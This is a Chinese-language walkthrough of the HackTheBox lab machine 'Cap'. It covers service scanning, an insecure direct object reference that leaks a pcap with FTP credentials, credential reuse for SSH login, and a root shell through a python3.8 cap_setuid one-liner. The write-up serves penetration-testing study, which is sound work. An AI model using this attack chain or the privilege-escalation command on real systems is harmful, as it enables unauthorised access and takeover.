# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。


# 服务探测
```
┌──(root💀kali)-[~/htb/cab]
└─# nmap -sV -Pn 10.10.10.245
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-28 08:33 EST
Nmap scan report for 10.10.10.245
Host is up (0.35s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    gunicorn
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

```

## 服务枚举分析
ftp不可以匿名登录

爆破目录没啥发现

80服务打开是一个像网络管理之类的后台（无需登录），展示了三个栏目分别对应ifconfig，netstat和截取流量服务（可以下载靶机的pcap文件）

看来攻击点主要在80端口

后台的用户名叫：```nathan```

在```http://10.10.10.245/data/1```这个页面每个5秒钟会更新一个pcap文件，当前时间可以下载最新的文件，循环范围是1-5

但是有登录信息的文件藏在0号文件里，也就是```http://10.10.10.245/data/0```

惊不惊喜，意不意外？


把第0个pcap文件下载到本地，用wireshark打开

第36个数据报找到ftp用户名：```nathan```

第40个数据报找到ftp密码：```{就不告诉你}```

## 登录ftp
```
┌──(root💀kali)-[~/htb/cap]
└─# ftp 10.10.10.245
Connected to 10.10.10.245.
220 (vsFTPd 3.0.3)
Name (10.10.10.245:root): nathan
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -alh
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 1001     1001         4096 May 27  2021 .
drwxr-xr-x    3 0        0            4096 May 23  2021 ..
lrwxrwxrwx    1 0        0               9 May 15  2021 .bash_history -> /dev/null
-rw-r--r--    1 1001     1001          220 Feb 25  2020 .bash_logout
-rw-r--r--    1 1001     1001         3771 Feb 25  2020 .bashrc
drwx------    2 1001     1001         4096 May 23  2021 .cache
-rw-r--r--    1 1001     1001          807 Feb 25  2020 .profile
lrwxrwxrwx    1 0        0               9 May 27  2021 .viminfo -> /dev/null
-r--------    1 1001     1001           33 Nov 28 15:32 user.txt
226 Directory send OK.

```


我们顺利登录到了ftp，看上去是```nathan```用户的home目录，看见有user.txt，但是我们没有权限读。

## 初始shell

很多懒惰的管理员都习惯用同样的登录信息用于各种服务，尝试用上面的登录凭证登录到ssh
```
┌──(root💀kali)-[~/htb/cap]
└─# ssh nathan@10.10.10.245                                       
The authenticity of host '10.10.10.245 (10.10.10.245)' can't be established.
ECDSA key fingerprint is SHA256:8TaASv/TRhdOSeq3woLxOcKrIOtDhrZJVrrE0WbzjSc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.245' (ECDSA) to the list of known hosts.
nathan@10.10.10.245's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Nov 28 16:00:07 UTC 2021

  System load:  0.0               Processes:             225
  Usage of /:   36.6% of 8.73GB   Users logged in:       0
  Memory usage: 21%               IPv4 address for eth0: 10.10.10.245
  Swap usage:   0%

  => There are 2 zombie processes.

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

63 updates can be applied immediately.
42 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu May 27 11:21:27 2021 from 10.10.14.7
nathan@cap:~$ pwd
/home/nathan
nathan@cap:~$ ls 
user.txt

```

拿到user.txt

# 提权

传linpea，发现python有setuid的能力

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```
用python提权

```
nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# id       
uid=0(root) gid=1001(nathan) groups=1001(nathan)
# whoami
root

```


